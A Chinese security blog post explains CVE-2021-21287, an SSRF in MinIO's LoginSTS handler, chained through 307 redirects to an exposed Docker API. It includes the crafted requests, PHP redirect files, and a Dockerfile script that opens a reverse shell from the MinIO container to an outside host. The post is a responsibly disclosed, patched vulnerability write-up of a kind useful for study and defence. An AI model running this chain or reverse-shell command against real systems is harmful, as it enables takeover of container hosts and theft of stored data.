
<!DOCTYPE html>
<html lang=en>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="HandheldFriendly" content="True">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
  <meta name="description" content="phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。">
  <meta name="keywords" content="phith0n,网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python">
  <link rel="shortcut icon" href="../static/cactus/images/favicon.ico">
  <link rel="icon" type="image/png" href="../static/cactus/images/favicon-192x192.png" sizes="192x192">
  <link rel="apple-touch-icon" sizes="180x180" href="../static/cactus/images/apple-touch-icon.png">
  <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="离别歌"/>

  <title>CVE-2021-21287: 容器与云的碰撞——一次对MinIO的测试 | 离别歌</title>
  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://cdn.staticfile.org/bootstrap/5.1.3/css/bootstrap-grid.min.css">
  <link rel="stylesheet" href="../static/cactus/css/style%EF%B9%96v=20220521.css">
  
  <link rel="stylesheet" href="../static/cactus/css/code%EF%B9%96v=20211026.css">
  <link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">

</head>
<body>



  <div class="sticky">
    <a href="#" id="menu-icon" class="menu-icon active"><i class="fa fa-bars fa-lg"></i></a>
    <div class="menu">
      <ul>
        <li><a href="../index.html">主页</a></li>
        <li><a href="javascript:history.back(-1)">返回</a></li>
      </ul>
      <br>
    </div>
    <div class="clearfix"></div>
    <div class="info" style="position: fixed">
      <span id="i-top" style="display: none">Back to top</span>
      <span id="i-share" style="display: none">Share post</span>
    </div>
    <ul class="actions">
      <li><a class="icon" href="#" id="back-top"><i
          class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();"
          onmouseout="$('#i-top').toggle();"></i></a></li>
      <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true"
                                      onmouseover="$('#i-share').toggle();"
                                      onmouseout="$('#i-share').toggle();"
                                      onclick="$('#share').toggleClass('hidden');return false;"></i></a></li>
    </ul>
    <div id="share" class="hidden">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html&amp;text=CVE-2021-21287%3A%20%E5%AE%B9%E5%99%A8%E4%B8%8E%E4%BA%91%E7%9A%84%E7%A2%B0%E6%92%9E%E2%80%94%E2%80%94%E4%B8%80%E6%AC%A1%E5%AF%B9MinIO%E7%9A%84%E6%B5%8B%E8%AF%95"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html&amp;title=CVE-2021-21287%3A%20%E5%AE%B9%E5%99%A8%E4%B8%8E%E4%BA%91%E7%9A%84%E7%A2%B0%E6%92%9E%E2%80%94%E2%80%94%E4%B8%80%E6%AC%A1%E5%AF%B9MinIO%E7%9A%84%E6%B5%8B%E8%AF%95"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html&amp;is_video=false&amp;description=CVE-2021-21287%3A%20%E5%AE%B9%E5%99%A8%E4%B8%8E%E4%BA%91%E7%9A%84%E7%A2%B0%E6%92%9E%E2%80%94%E2%80%94%E4%B8%80%E6%AC%A1%E5%AF%B9MinIO%E7%9A%84%E6%B5%8B%E8%AF%95"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2021-21287%3A%20%E5%AE%B9%E5%99%A8%E4%B8%8E%E4%BA%91%E7%9A%84%E7%A2%B0%E6%92%9E%E2%80%94%E2%80%94%E4%B8%80%E6%AC%A1%E5%AF%B9MinIO%E7%9A%84%E6%B5%8B%E8%AF%95&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html&amp;title=CVE-2021-21287%3A%20%E5%AE%B9%E5%99%A8%E4%B8%8E%E4%BA%91%E7%9A%84%E7%A2%B0%E6%92%9E%E2%80%94%E2%80%94%E4%B8%80%E6%AC%A1%E5%AF%B9MinIO%E7%9A%84%E6%B5%8B%E8%AF%95"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html&amp;title=CVE-2021-21287%3A%20%E5%AE%B9%E5%99%A8%E4%B8%8E%E4%BA%91%E7%9A%84%E7%A2%B0%E6%92%9E%E2%80%94%E2%80%94%E4%B8%80%E6%AC%A1%E5%AF%B9MinIO%E7%9A%84%E6%B5%8B%E8%AF%95"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html&amp;title=CVE-2021-21287%3A%20%E5%AE%B9%E5%99%A8%E4%B8%8E%E4%BA%91%E7%9A%84%E7%A2%B0%E6%92%9E%E2%80%94%E2%80%94%E4%B8%80%E6%AC%A1%E5%AF%B9MinIO%E7%9A%84%E6%B5%8B%E8%AF%95"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html&amp;title=CVE-2021-21287%3A%20%E5%AE%B9%E5%99%A8%E4%B8%8E%E4%BA%91%E7%9A%84%E7%A2%B0%E6%92%9E%E2%80%94%E2%80%94%E4%B8%80%E6%AC%A1%E5%AF%B9MinIO%E7%9A%84%E6%B5%8B%E8%AF%95"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html&amp;name=CVE-2021-21287%3A%20%E5%AE%B9%E5%99%A8%E4%B8%8E%E4%BA%91%E7%9A%84%E7%A2%B0%E6%92%9E%E2%80%94%E2%80%94%E4%B8%80%E6%AC%A1%E5%AF%B9MinIO%E7%9A%84%E6%B5%8B%E8%AF%95&amp;description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
</ul>
    </div>
  </div>

  <div class="container-md">
    <div class="article row justify-content-center min-height">
      <div class="col-lg-8 col-md-10 col-sm-12">
        <article itemscope itemtype="http://schema.org/BlogPosting">
          <header class="post-header">
            <h1 class="color-main h1 mb-0" itemprop="name headline">CVE-2021-21287: 容器与云的碰撞——一次对MinIO的测试</h1>
            <div class="meta">
              <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
                <span itemprop="name">phithon</span>
              </span>

              <div class="postdate">
                <time datetime="2021年1月30日 22:25" itemprop="datePublished">
                  2021 一月 30 22:25
                </time>
              </div>

              <div class="article-tag">
                阅读：67207
              </div>

              
                <div class="article-tag">
                  <i class="fa fa-bookmark"></i>
                  <a class="tag-link" href="../sort/PENETRATION.html">网络安全</a>
                </div>
              

              
                <div class="article-tag">
                  <i class="fa fa-tag"></i>
                  
                    <a class="tag-link" href="../tag/minio.html">minio</a>,
                  
                  
                    <a class="tag-link" href="../tag/Go.html">Go</a>,
                  
                  
                    <a class="tag-link" href="../tag/ssrf%E6%BC%8F%E6%B4%9E.html">ssrf漏洞</a>
                  
                </div>
              
            </div>
          </header>
          <div class="content" itemprop="articleBody">
            <blockquote>
<p>事先声明：本次测试过程完全处于本地或授权环境，仅供学习与参考，不存在未授权测试过程。本文提到的漏洞《<a href="https://github.com/minio/minio/security/advisories/GHSA-m4qq-5f7c-693q">MinIO未授权SSRF漏洞（CVE-2021-21287）</a>》已经修复，也请读者勿使用该漏洞进行未授权测试，否则作者不承担任何责任</p>
</blockquote>
<p>(<a href="the-collision-of-containers-and-the-cloud-pentesting-a-MinIO-EN.html">English edition</a>)</p>
<p>随着工作和生活中的一些环境逐渐往云端迁移，对象存储的需求也逐渐多了起来，<a href="https://min.io/">MinIO</a>就是一款支持部署在私有云的开源对象存储系统。MinIO完全兼容AWS S3的协议，也支持作为S3的网关，所以在全球被广泛使用，在Github上已有25k星星。</p>
<p>我平时会将一些数据部署在MinIO中，在CI、Dockerfile等地方进行使用。本周就遇到了一个环境，其中发现一个MinIO，其大概情况如下：</p>
<ul>
<li>MinIO运行在一个小型Docker集群（swarm）中</li>
<li>MinIO开放默认的9000端口，外部可以访问，地址为<code>http://192.168.227.131:9000</code>，但是不知道账号密码</li>
<li><code>192.168.227.131</code>这台主机是CentOS系统，默认防火墙开启，外部只能访问9000端口，dockerd监听在内网的2375端口（其实这也是一个swarm管理节点，swarm监听在2377端口）</li>
</ul>
<p>本次测试目标就是窃取MinIO中的数据，或者直接拿下。</p>
<h2 id="0x01-minio"><a class="toclink" href="#0x01-minio">0x01 MinIO代码审计</a></h2>
<p>既然我们选择了从MinIO入手，那么先了解一下MinIO。其实我前面也说了，因为平时用到MinIO的时候很多，所以这一步可以省略了。其使用Go开发，提供HTTP接口，而且还提供了一个前端页面，名为“MinIO Browser”。当然，前端页面就是一个登陆接口，不知道口令无法登录。</p>
<p>那么从入口点（前端接口）开始对其进行代码审计吧。</p>
<p>在User-Agent满足正则<code>.*Mozilla.*</code>的情况下，我们即可访问MinIO的前端接口，前端接口是一个自己实现的JsonRPC：</p>
<p><a href="../media/attachment/2021/01/30/6896653c-ba8c-476c-a224-6b6dfce60186.png"><img alt="image-20210124211255239.png" src="../media/attachment/2021/01/30/6896653c-ba8c-476c-a224-6b6dfce60186.b343e5876f15.png" /></a></p>
<p>我们感兴趣的就是其鉴权的方法，随便找到一个RPC方法，可见其开头调用了<code>webRequestAuthenticate</code>，跟进看一下，发现这里用的是jwt鉴权：</p>
<p><a href="../media/attachment/2021/01/30/7861ca8b-00bb-4393-bee8-98331154fdae.png"><img alt="image-20210124211738748.png" src="../media/attachment/2021/01/30/7861ca8b-00bb-4393-bee8-98331154fdae.c06372e6404a.png" /></a></p>
<p>jwt常见的攻击方法主要有下面这几种：</p>
<ul>
<li>将alg设置为None，告诉服务器不进行签名校验</li>
<li>如果alg为RSA，可以尝试修改为HS256，即告诉服务器使用公钥进行签名的校验</li>
<li>爆破签名密钥</li>
</ul>
<p>查看MinIO的JWT模块，发现其中对alg进行了校验，只允许以下三种签名方法：</p>
<p><a href="../media/attachment/2021/01/30/580f2f79-5147-4810-b517-72dfffa6fae8.png"><img alt="image-20210124212344593.png" src="../media/attachment/2021/01/30/580f2f79-5147-4810-b517-72dfffa6fae8.0acbf2375916.png" /></a></p>
<p>这就堵死了前两种绕过方法，爆破当然就更别说了，通常仅作为没办法的情况下的手段。当然，MinIO中使用用户的密码作为签名的密钥，这个其实会让爆破变地简单一些。</p>
<p>鉴权这块没啥突破，我们就可以看看，有哪些RPC接口没有进行权限验证。</p>
<p>很快找到了一个接口，<code>LoginSTS</code>。这个接口其实是AWS STS登录接口的一个代理，用于将发送到JsonRPC的请求转变成STS的方式转发给本地的9000端口（也就还是他自己，因为它是兼容AWS协议的）。</p>
<p>简化其代码如下：</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// LoginSTS - STS user login handler.</span>
<span class="kd">func</span> <span class="p">(</span><span class="nx">web</span> <span class="o">*</span><span class="nx">webAPIHandlers</span><span class="p">)</span> <span class="nx">LoginSTS</span><span class="p">(</span><span class="nx">r</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">,</span> <span class="nx">args</span> <span class="o">*</span><span class="nx">LoginSTSArgs</span><span class="p">,</span> <span class="nx">reply</span> <span class="o">*</span><span class="nx">LoginRep</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
    <span class="nx">ctx</span> <span class="o">:=</span> <span class="nx">newWebContext</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span> <span class="nx">args</span><span class="p">,</span> <span class="s">&quot;WebLoginSTS&quot;</span><span class="p">)</span>

    <span class="nx">v</span> <span class="o">:=</span> <span class="nx">url</span><span class="p">.</span><span class="nx">Values</span><span class="p">{}</span>
    <span class="nx">v</span><span class="p">.</span><span class="nx">Set</span><span class="p">(</span><span class="s">&quot;Action&quot;</span><span class="p">,</span> <span class="nx">webIdentity</span><span class="p">)</span>
    <span class="nx">v</span><span class="p">.</span><span class="nx">Set</span><span class="p">(</span><span class="s">&quot;WebIdentityToken&quot;</span><span class="p">,</span> <span class="nx">args</span><span class="p">.</span><span class="nx">Token</span><span class="p">)</span>
    <span class="nx">v</span><span class="p">.</span><span class="nx">Set</span><span class="p">(</span><span class="s">&quot;Version&quot;</span><span class="p">,</span> <span class="nx">stsAPIVersion</span><span class="p">)</span>

    <span class="nx">scheme</span> <span class="o">:=</span> <span class="s">&quot;http&quot;</span>
    <span class="c1">// ...</span>

    <span class="nx">u</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">url</span><span class="p">.</span><span class="nx">URL</span><span class="p">{</span>
        <span class="nx">Scheme</span><span class="p">:</span> <span class="nx">scheme</span><span class="p">,</span>
        <span class="nx">Host</span><span class="p">:</span>   <span class="nx">r</span><span class="p">.</span><span class="nx">Host</span><span class="p">,</span>
    <span class="p">}</span>

    <span class="nx">u</span><span class="p">.</span><span class="nx">RawQuery</span> <span class="p">=</span> <span class="nx">v</span><span class="p">.</span><span class="nx">Encode</span><span class="p">()</span>
    <span class="nx">req</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">http</span><span class="p">.</span><span class="nx">NewRequest</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">MethodPost</span><span class="p">,</span> <span class="nx">u</span><span class="p">.</span><span class="nx">String</span><span class="p">(),</span> <span class="kc">nil</span><span class="p">)</span>
    <span class="c1">// ...</span>
<span class="p">}</span>
</code></pre></div>

<p>没发现有鉴权上的绕过问题，但是发现了另一个有趣的问题。这里，MinIO为了将请求转发给“自己”，就从用户发送的HTTP头Host中获取到“自己的地址”，并将其作为URL的Host构造了新的URL。</p>
<p>这个过程有什么问题呢？</p>
<p>因为请求头是用户可控的，所以这里可以构造任意的Host，进而构造一个SSRF漏洞。</p>
<p>我们来实际测试一下，向<code>http://192.168.227.131:9000</code>发送如下请求，其中Host的值是我本地ncat开放的端口（<code>192.168.1.142:4444</code>）：</p>
<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/minio/webrpc</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">192.168.1.142:4444</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">80</span>

<span class="p">{</span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span><span class="nt">&quot;params&quot;</span><span class="p">:{</span><span class="nt">&quot;token&quot;</span><span class="p">:</span>  <span class="s2">&quot;Test&quot;</span><span class="p">},</span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="s2">&quot;web.LoginSTS&quot;</span><span class="p">}</span>
</code></pre></div>

<p>成功收到请求：</p>
<p><a href="../media/attachment/2021/01/30/ebe8ebd1-d1c1-4d28-92e7-8da4774e940e.png"><img alt="image-20210124215812861.png" src="../media/attachment/2021/01/30/ebe8ebd1-d1c1-4d28-92e7-8da4774e940e.6488ddc9fcc5.png" /></a></p>
<p>可以确定这里存在一个SSRF漏洞了。</p>
<h2 id="0x02-ssrf"><a class="toclink" href="#0x02-ssrf">0x02 升级SSRF漏洞</a></h2>
<p>仔细观察，可以发现这是一个POST请求，但是Path和Body都没法控制，我们能控制的只有URL中的一个参数<code>WebIdentityToken</code>。</p>
<p>但是这个参数经过了URL编码，无法注入换行符等其他特殊字符。这样就比较鸡肋了，如果仅从现在来看，这个SSRF只能用于扫描端口。我们的目标当然不仅限于此。</p>
<p>幸运的是，Go默认的http库会跟踪302跳转，而且不论是GET还是POST请求。所以，我们这里可以302跳转来“升级”SSRF漏洞。</p>
<p>使用PHP来简单地构造一个302跳转：</p>
<div class="codehilite"><pre><span></span><code><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: http://192.168.1.142:4444/attack?arbitrary=params&#39;</span><span class="p">);</span>
</code></pre></div>

<p>将其保存成index.php，启动一个PHP服务器：</p>
<p><a href="../media/attachment/2021/01/30/d699b863-4102-4479-a4e0-71d15efaf1c3.png"><img alt="image-20210124225105734.png" src="../media/attachment/2021/01/30/d699b863-4102-4479-a4e0-71d15efaf1c3.21a8369589c2.png" /></a></p>
<p>将Host指向这个PHP服务器。这样，经过一次302跳转，我们收获了一个可以控制完整URL的GET请求：</p>
<p><a href="../media/attachment/2021/01/30/187c113f-1d4a-4806-897d-4e3f62c25042.png"><img alt="image-20210124224837443.png" src="../media/attachment/2021/01/30/187c113f-1d4a-4806-897d-4e3f62c25042.28dcdefd4ec2.png" /></a></p>
<p>放宽了一些限制，结合前面我对这套内网的了解，我们可以尝试攻击Docker集群的2375端口。</p>
<p>2375是Docker API的接口，使用HTTP协议通信，默认不会监听TCP地址，这里可能是为了方便内网其他机器使用所以开放在内网的地址里了。那么，我们是否可以通过SSRF来攻击这个接口呢？</p>
<p>在Docker未授权访问的情况下，我们通常可以使用<code>docker run</code>或<code>docker exec</code>来在目标容器里执行任意命令（如果你不了解，可以参考<a href="http://blog.neargle.com/SecNewsBak/drops/%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8.html">这篇文章</a>）。但是翻阅Docker的文档可知，这两个操作的请求是<code>POST /containers/create</code>和<code>POST /containers/{id}/exec</code>。</p>
<p>两个API都是POST请求，而我们可以构造的SSRF却是一个GET的。怎么办呢？</p>
<h2 id="0x03-ssrf"><a class="toclink" href="#0x03-ssrf">0x03 再次升级SSRF漏洞</a></h2>
<p>还记得我们是怎样获得这个GET型的SSRF的吗？通过302跳转，而接受第一次跳转的请求就是一个POST请求。不过我们没法直接利用这个POST请求，因为他的Path不可控。</p>
<p>如何构造一个Path可控的POST请求呢？</p>
<p>我想到了307跳转，307跳转是在<a href="https://tools.ietf.org/html/rfc7231#page-58">RFC 7231</a>中定义的一种HTTP状态码，描述如下：</p>
<blockquote>
<p>The 307 (Temporary Redirect) status code indicates that the target resource resides temporarily under a different URI and the user agent <strong>MUST NOT</strong> change the request method if it performs an automatic redirection to that URI.</p>
</blockquote>
<p>307跳转的特点就是<strong>不会</strong>改变原始请求的方法，也就是说，在服务端返回307状态码的情况下，客户端会按照Location指向的地址发送一个相同方法的请求。</p>
<p>我们正好可以利用这个特性，来获得POST请求。</p>
<p>简单修改一下之前的index.php：</p>
<div class="codehilite"><pre><span></span><code><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: http://192.168.1.142:4444/attack?arbitrary=params&#39;</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="mi">307</span><span class="p">);</span>
</code></pre></div>

<p>尝试SSRF攻击，收到了预期的请求：</p>
<p><a href="../media/attachment/2021/01/30/565c0dff-2e74-4ea0-995a-38881ae7207d.png"><img alt="image-20210124232243242.png" src="../media/attachment/2021/01/30/565c0dff-2e74-4ea0-995a-38881ae7207d.7dbb1fcf3d08.png" /></a></p>
<p>Bingo，获得了一个POST请求的SSRF，虽然没有Body。</p>
<h2 id="0x04-docker-api"><a class="toclink" href="#0x04-docker-api">0x04 攻击Docker API</a></h2>
<p>回到Docker API，我发现现在仍然没法对run和exec两个API做利用，原因是，这两个API都需要在请求Body中传输JSON格式的参数，而我们这里的SSRF无法控制Body。</p>
<p>继续翻越Docker文档，我发现了另一个API，<a href="https://docs.docker.com/engine/api/v1.41/#operation/ImageBuild">Build an image</a>：</p>
<p><a href="../media/attachment/2021/01/30/81f686d6-4580-428a-bb4c-d2dc4f2b23d8.png"><img alt="image-20210124232945843.png" src="../media/attachment/2021/01/30/81f686d6-4580-428a-bb4c-d2dc4f2b23d8.5026e621dd2a.png" /></a></p>
<p>这个API的大部分参数是通过Query Parameters传输的，我们可以控制。阅读其中的选项，发现它可以接受一个名为<code>remote</code>的参数，其说明为：</p>
<blockquote>
<p>A Git repository URI or HTTP/HTTPS context URI. If the URI points to a single text file, the file’s contents are placed into a file called <code>Dockerfile</code> and the image is built from that file. If the URI points to a tarball, the file is downloaded by the daemon and the contents therein used as the context for the build. If the URI points to a tarball and the <code>dockerfile</code> parameter is also specified, there must be a file with the corresponding path inside the tarball.</p>
</blockquote>
<p>这个参数可以传入一个Git地址或者一个HTTP URL，内容是一个Dockerfile或者一个包含了Dockerfile的Git项目或者一个压缩包。</p>
<p>也就是说，Docker API支持通过指定远程URL的方式来构建镜像，而不需要我在本地写入一个Dockerfile。</p>
<p>所以，我尝试编写了这样一个Dockerfile，看看是否能够build这个镜像，如果可以，那么我的4444端口应该能收到wget的请求：</p>
<div class="codehilite"><pre><span></span><code><span class="k">FROM</span> <span class="s">alpine:3.13</span>
<span class="k">RUN</span> wget -T4 http://192.168.1.142:4444/docker/build
</code></pre></div>

<p>然后修改前面的index.php，指向Docker集群的2375端口：</p>
<div class="codehilite"><pre><span></span><code><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: http://192.168.227.131:2375/build?remote=http://192.168.1.142:4443/Dockerfile&amp;nocache=true&amp;t=evil:1&#39;</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="mi">307</span><span class="p">);</span>
</code></pre></div>

<p>进行SSRF攻击，等待了一会儿，果然收到请求了：</p>
<p><a href="../media/attachment/2021/01/30/db483d55-f1d5-4a3e-9d00-b53d9833d464.png"><img alt="image-20210124233853616.png" src="../media/attachment/2021/01/30/db483d55-f1d5-4a3e-9d00-b53d9833d464.da172f0b4e32.png" /></a></p>
<p>完美，我们已经可以在目标集群容器里执行任意命令了。</p>
<h2 id="0x05-minio"><a class="toclink" href="#0x05-minio">0x05 拿下MinIO容器</a></h2>
<p>此时离我们的目标，拿下MinIO，还差一点点，后面的攻击其实就比较简单了。</p>
<p>因为现在可以执行任意命令，我们就不会再受到SSRF漏洞的限制，可以直接反弹一个shell，或者可以直接发送任意数据包到Docker API，来访问容器。经过一顿测试，我发现MinIO虽然是运行的一个service，但实际上就只有一个容器。</p>
<p>所以我编写了一个自动化攻击MinIO容器的脚本，并将其放在了Dockerfile中，让其在Build的时候进行攻击，利用<code>docker exec</code>在MinIO的容器里执行反弹shell的命令。这个Dockerfile如下：</p>
<div class="codehilite"><pre><span></span><code><span class="k">FROM</span> <span class="s">alpine:3.13</span>

<span class="k">RUN</span> apk add curl bash jq

<span class="k">RUN</span> <span class="nb">set</span> -ex <span class="o">&amp;&amp;</span> <span class="se">\</span>
    <span class="o">{</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;#!/bin/bash&#39;</span><span class="p">;</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;set -ex&#39;</span><span class="p">;</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;target=&quot;http://192.168.227.131:2375&quot;&#39;</span><span class="p">;</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;jsons=$(curl -s -XGET &quot;${target}/containers/json&quot; | jq -r &quot;.[] | @base64&quot;)&#39;</span><span class="p">;</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;for item in ${jsons[@]}; do&#39;</span><span class="p">;</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;    name=$(echo $item | base64 -d | jq -r &quot;.Image&quot;)&#39;</span><span class="p">;</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;    if [[ &quot;$name&quot; == *&quot;minio/minio&quot;* ]]; then&#39;</span><span class="p">;</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;        id=$(echo $item | base64 -d | jq -r &quot;.Id&quot;)&#39;</span><span class="p">;</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;        break&#39;</span><span class="p">;</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;    fi&#39;</span><span class="p">;</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;done&#39;</span><span class="p">;</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;execid=$(curl -s -X POST &quot;${target}/containers/${id}/exec&quot; -H &quot;Content-Type: application/json&quot; --data-binary &quot;{\&quot;Cmd\&quot;: [\&quot;bash\&quot;, \&quot;-c\&quot;, \&quot;bash -i &gt;&amp; /dev/tcp/192.168.1.142/4444 0&gt;&amp;1\&quot;]}&quot; | jq -r &quot;.Id&quot;)&#39;</span><span class="p">;</span> <span class="se">\</span>
        <span class="nb">echo</span> <span class="s1">&#39;curl -s -X POST &quot;${target}/exec/${execid}/start&quot; -H &quot;Content-Type: application/json&quot; --data-binary &quot;{}&quot;&#39;</span><span class="p">;</span> <span class="se">\</span>
    <span class="o">}</span> <span class="p">|</span> bash
</code></pre></div>

<p>这个脚本所干的事情比较简单，一个是遍历了所有容器，如果发现其镜像的名字中包含<code>minio/minio</code>，则认为这个容器就是MinIO所在的容器。拿到这个容器的Id，用exec的API，在其中执行反弹shell的命令。</p>
<p>最后成功<a href="https://youtu.be/WyDEn0wUhPc">拿到MinIO容器的shell</a>：</p>
<p><iframe width="560" height="315" src="https://www.youtube.com/embed/WyDEn0wUhPc" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></p>
<p>当然，我们也可以通过Docker API来获取集群权限，这不在本文的介绍范围内了。</p>
<h2 id="0x06"><a class="toclink" href="#0x06">0x06 总结</a></h2>
<p>本次测试开始于一个MinIO开放的9000端口，通过代码审计，挖掘到了MinIO的一个SSRF漏洞，又利用这个漏洞攻击内网的Docker API，最终拿到了MinIO的权限。</p>
<p>本文所涉及的漏洞已经提交给MinIO官方并修复，以下是时间线：</p>
<ul>
<li>Jan 23, 2021, 9:11 PM - 漏洞提交 </li>
<li>Jan 24, 2021, 3:06 AM - 漏洞确认</li>
<li>Jan 26, 2021, 2:15 AM - 修复已被合并进主线分支</li>
<li>Jan 30, 2021, 11:22 AM - <a href="https://github.com/minio/minio/security/advisories/GHSA-m4qq-5f7c-693q">漏洞公告</a>和新版本被发布</li>
<li>Feb 2, 2021 01:10 AM - 确认编号 - CVE-2021-21287</li>
</ul>
          </div>
        </article>

        
          <h1 class="h1 color-main">赞赏</h1>
          <div class="zan text-center">
            <p>喜欢这篇文章？打赏1元</p>
            <p class="m-0"><img src="../static/wx.jpg" width="280" alt=""></p>
          </div>
        

        <div id="reply-list">
          <h1 class="h1 color-main">评论</h1>
          
            
              <div class="flex mb-2" id="comment-3877">
                <div class="gravatar">
                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="" target="_blank" rel="nofollow noopener">Chein</a>
                    <time datetime="2022年6月6日 17:59" itemprop="datePublished">
                      2022 六月 06 17:59
                    </time>
                    <a href="javascript:reply_to('3877', 'Chein')">回复</a>
                  </p>
                  <p class="comment-meta">这个是不是只有在启用minio ui的时候可利用？</p>
                </div>
              </div>
              
                
                  <div class="child-node">
              <div class="flex mb-2" id="comment-3879">
                <div class="gravatar">
                  <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="https://www.leavesongs.com" target="_blank" rel="nofollow noopener">phithon</a>
                    <time datetime="2022年6月7日 10:16" itemprop="datePublished">
                      2022 六月 07 10:16
                    </time>
                    <a href="javascript:reply_to('3879', 'phithon')">回复</a>
                  </p>
                  <p class="comment-meta">@Chein 是的</p>
                </div>
              </div>
              
            </div>
                
              
            
              <div class="flex mb-2" id="comment-3717">
                <div class="gravatar">
                  <img src="https://secure.gravatar.com/avatar/58520cf94521d0dc4858be1e465829a1.jpg?s=100&amp;d=mm&amp;r=g" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
